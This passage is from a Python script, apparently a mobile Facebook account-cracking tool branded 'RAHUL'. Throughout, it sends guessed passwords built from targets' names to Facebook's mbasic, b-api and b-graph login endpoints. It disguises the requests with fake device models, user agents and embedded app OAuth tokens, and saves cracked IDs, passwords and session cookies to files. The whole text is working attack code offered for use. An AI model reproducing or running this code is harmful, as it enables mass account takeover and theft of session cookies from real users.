                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        ua=random.choice(ugen)
                        head = {                         
                           'authority': 'p.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9,ur-PK;q=0.8,ur;q=0.7',
    'cache-control': 'max-age=0',
    'referer': 'https://mbasic.facebook.com/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
}
                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        RAHUL=str(session.cookies)
                        if "c_user" in RAHUL:
                                print('\r\r\033[1;32m [RAHUL-OK] %s | %s'%(ids,pas))
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                open('/sdcard/RAHUL-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/RAHUL-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in RAHUL:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [RAHUL-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RAHUL-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1        
xxxxx=('SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H')
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [RAHUL-RB M3] %s|\033[1;32mOK:-%s \033[1;37m%s%% \033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                sim = random.choice(['2e4', '4e4'])
                                version = str(random.randrange(8,15))
                                osv = str(random.randrange(1,9))
                                abv = ['A','B','C']
                                if '8' in version:
                                        ipsw = '12'+random.choice(abv)+str(random.randint(11,99))
                                elif '9' in version:
                                        ipsw = '13'+random.choice(abv)+str(random.randint(11,99))
                                elif '10' in version:
                                        ipsw = '14'+random.choice(abv)+str(random.randint(11,99))
                                elif '11' in version:
                                        ipsw = '15'+random.choice(abv)+str(random.randint(11,99))
                                elif '12' in version:
                                        ipsw = '16'+random.choice(abv)+str(random.randint(11,99))
                                elif '13' in version:
                                        ipsw = '17'+random.choice(abv)+str(random.randint(11,99))
                                elif '14' in version:
                                        ipsw = '18'+random.choice(abv)+str(random.randint(11,99))
                                elif '15' in version:
                                        ipsw = '19'+random.choice(abv)+str(random.randint(11,99))
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']

                                model,build = random.choice(samsung).split('|')
                                fbdv = model
                                fbsv = str(random.randrange(6,11))
                                fblc = 'ar_EG'
                                fbpn = 'com.facebook.katana'
                                fbav = str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))
                                fban = 'FB4A'
                                fban = 'FB4A'

                                fbpn = 'com.facebook.katana'

                                fbav = str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))

                                fbbv = '34'+str(random.randint(1111111,9999999))

                                fbcr = 'Ufone'

                                fbmf = 'Samsung'

                                fbbd = 'samsung'

                                fbdv = model

                                fbsv = str(random.randrange(6,11))

                                fbca = 'arm64-v8a'

                                fblc = 'ar_EG'

                                fbdm = '{desity=3.25,width=1080,height=2028}'

                                fb_fw = '1'

                                ua = 'Dalvik/2.1.0 (Linux; U; Android '+fbsv+'; '+fbdv+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBPN/'+fbpn+';FBLC/'+fblc+';FBBV/'+fbbv+';FBBD/'+fbbd+';FBDV/'+model+';FBSV/'+fbsv+';FBCA/'+fbca+';FBDM/'+fbdm+';FB_FW/'+fb_fw+';]'
                                adid = str(uuid.uuid4())
                                device_id = str(random.randint(11111111,9999999999))
                                li = ['28','29','210']
                                li2 = random.choice(li)
                                j1 = ''.join(random.choice(digits) for _ in range(2))
                                j2 = li2+j1
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'device_id':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        "sim_country": "id",
                                        "network_country": "id",
                                        'machine_id': ''.join(random.choices(string.ascii_lowercase + string.digits, k=24)),
                                        'meta_inf_fbmeta': '',
                                        'locale': 'pl_PL', 
                                        'client_country_code': 'PL', 
                                        'device': adid, 
                                        "currently_logged_in_userid" : "0",
                                        "fb4a_shared_phone_cpl_experiment": "fb4a_shared_phone_nonce_cpl_at_risk_v3",
                                        "fb4a_shared_phone_cpl_group": "enable_v3_at_risk",
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':sim,
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',
                                        'user-agent':'Davik/2.1.0 (Linux; U; Android '+fbsv+'.0.0; '+model+' Build/'+''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))+' [FBAN/FB4A;FBAV/'+str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))
+';FBBV/'+str(random.randint(745000000,745999999))+';FBDM/{density=1.5,width=480,height=800};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.adsmanager;FBDV/'+model+';FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]',
                                        'x-fb-net-hni':sim,
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [RAHUL-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RAHUL-OK.txt','a').write(ids+'|'+pas+'\n')
                                        open('/sdcard/RAHUL-COOKIE.txt','a').write(coki+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [RAHUL-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/RAHUL-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        print(e)
                                                                                   
def api2(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [RAHUL-RB M4] %s|\033[1;32mOK:-%s \033[1;37m%s%% \033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                ua=random.choice(ugen)
                                sim = str(random.randint(11111, 99999))
                                xfb_device = str(random.randint(1111, 9999))
                                android_version=str(random.randrange(6,13))
                                device_id = str(uuid.uuid4())
                                ua_string = '[FBAN/FB4A;FBAV/34.0.0.1743;FBBV/2408045;[[FBAN/FB4A;FBAV/289.0.0.40.121;FBBV/246888191;FBDM/{density=2.625,width=1080,height=2047};FBLC/tr_TR;FBRV/248143325;FBCR/vodafone NL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]'
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "error_detail_type": "button_with_disabled",
                                        "locale":"es_CU","client_country_code":"CU",
                                        "generate_session_cookies": "1",
                                        "meta_inf_fbmeta": "",
                                        "advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
                                        "currently_logged_in_userid": "0",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "api_key": "882a8490361da98702bf97a021ddc14d",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'x-fb-sim-hni':sim,
                                        'x-fb-net-hni':sim,
                                        'x-fb-connection-type':'unknown',
                                        'user-agent':ua_string,
                                        'x-fb-device-group': '5120',
                                        'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                                        'X-FB-Request-Analytics-Tags': 'graphservice',
                                        'X-FB-HTTP-Engine': 'Liger',
                                        'X-FB-Client-IP': 'True',
                                        'X-FB-Server-Cluster': 'True',
                                        'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32', 
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [RAHUL-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RAHUL-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [RAHUL-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/RAHUL-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                open('/sdcard/RAHUL-COOKIE.txt','a').write(coki+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/RAHUL-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
def rndm(ids,passlist):
        global loop,oks,lim
        p=round(loop*100/lim,2)
                
        sys.stdout.write('\r\r\033[1;37m [RAHUL-RB] %s|\033[1;32mOK:-%s \033[1;37m%s%% \033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
        try:
                for pas in passlist:
                        application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                        application_version_code=str(random.randint(000000000,999999999))
                        fbs=random.choice(fbks)
                        gtt=random.choice(xxxxx)
                        gttt=random.choice(xxxxx)
                        ua=random.choice(ugen)
                        android_version=str(random.randrange(6,13))
                        ua_string = '[FBAN/FB4A;FBAV/34.0.0.1743;FBBV/2408045;[[FBAN/FB4A;FBAV/289.0.0.40.121;FBBV/246888191;FBDM/{density=2.625,width=1080,height=2047};FBLC/tr_TR;FBRV/248143325;FBCR/vodafone NL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]'
                        device_id = str(uuid.uuid4())
                        adid = str(uuid.uuid4())
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device':gtt,
                                'device_id':adid,
                                'email':ids,
                                'password':pas,
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "reg_instance": str(uuid.uuid4()),
                                "session_id": str(uuid.uuid4()),
                                "advertiser_id": str(uuid.uuid4()),
                                "community_id": "",
                                "try_num": "1",
                                "relative_url": "auth.login",
                                'error_detail_type':'button_with_disabled',
                                'locale': 'pl_PL', 'client_country_code': 'PL',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                "method": "auth.login",
                                'generate_machine_id':'1',
                                "locale":"en_US","client_country_code":"US",
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        #print(data)
                        accessToken="350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                "X-FB-Connection-Quality": "Excellent",
                                'X-FB-Net-HNI': str(random.randint(745000000,745999999)),
                                'X-FB-SIM-HNI': str(random.randint(745000000,745999999)),
                                'X-FB-Connection-Type': 'unknown',
                                'x-fb-connection-bandwidth': str(random.randint(2e7, 3e7)),
                                'X-FB-Client-IP': 'True',
                                'X-FB-Server-Cluster': 'True',
                                'Content-Length': '698',
                                'User-Agent':ua_string,
                                'Accept-Encoding':'gzip, deflate',
                                'x-fb-device-group': '5120',
                                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                                'X-FB-Request-Analytics-Tags': 'graphservice',
                                'X-FB-HTTP-Engine': 'Liger',
                                'X-FB-Client-IP': 'True',
                                'X-FB-Server-Cluster': 'True',
                                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        #print(po)
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [RAHUL-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/RAHUL-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/RAHUL-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\x1b[38;5;208m [RAHUL-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/RAHUL-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass

try:
        approval()
except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
except Exception as e:pass
menu()

